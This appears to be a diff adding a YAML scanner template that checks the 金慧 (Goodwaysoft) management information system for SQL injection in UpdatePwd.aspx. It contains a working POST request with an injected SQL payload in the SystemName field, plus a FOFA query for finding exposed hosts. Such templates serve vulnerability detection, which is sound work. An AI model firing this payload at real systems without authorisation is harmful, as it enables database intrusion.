@@ -1,0 +1,21 @@
+id: poc-yaml-goodwaysoft-updatepwd-aspx-sqli
+info:
+  name: 金慧综合管理信息系统 UpdatePwd.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - SQL注入
+  finger: 金慧综合管理信息系统
+  fofa: body="/Portal/LoginBegin.aspx"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Portal/UpdatePwd.aspx?LoginName=
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTIwNjIxOTEwOWRkBbaTvhv%2ByWbTKSTVx1y6E7qFnAo%3D&__VIEWSTATEGENERATOR=7FC147DC&__EVENTVALIDATION=%2FwEdAAeBOWHyzxoRUImq0lfI2qvAUYglfMtBarbH2LeBEFZ3blwK8%2F1gnn25OldlRNyIedkf1P6GTiFbwnVHMajaCmuzDXCKeN7Biz3dpLrvtu21sFabMRbi%2F2A4oZV6XkcK0do6klUczeYxH4SdGieOR28Q1VJ0AFks4WshtgQDeQmeEVRN5uY%3D&SystemName='+or+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--&Password=&NewPassword1=&NewPassword2=&ButtonSave=%E7%A1%AE%E5%AE%9A
+  expression: "status_code == 500 && \ncontains(body,\"0x\" + t2) &&\ncontains(body,\"\
+    SqlException\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\") &&\nmatches(body,\"在将(.*?)值\"\
+    )\n"
+transport: http
